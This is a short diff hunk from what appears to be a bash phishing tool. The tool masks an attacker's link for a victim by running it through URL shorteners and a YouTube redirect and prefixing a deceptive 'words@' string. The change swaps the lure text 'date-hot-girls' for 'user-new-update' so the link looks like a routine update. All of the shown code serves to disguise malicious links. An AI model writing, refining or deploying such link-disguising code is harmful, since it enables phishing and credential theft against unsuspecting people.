@@ -28,7 +28,7 @@ echo -e "\e[91m[\e[92mLINKS\e[91m]:\e[0m Send One Of These Links To Victim"
 final=$words@$shorter
 shortb=$(curl -s https://da.gd/s/?url=${link})
 shorterb=${shortb#https://}
-wordsb="date-hot-girls"
+wordsb="user-new-update"
 finalb=$wordsb@$shorterb
 url="https://m.youtube.com/redirect?q=${link}"
 tiny=$(curl -s http://tinyurl.com/api-create.php?url=${url})
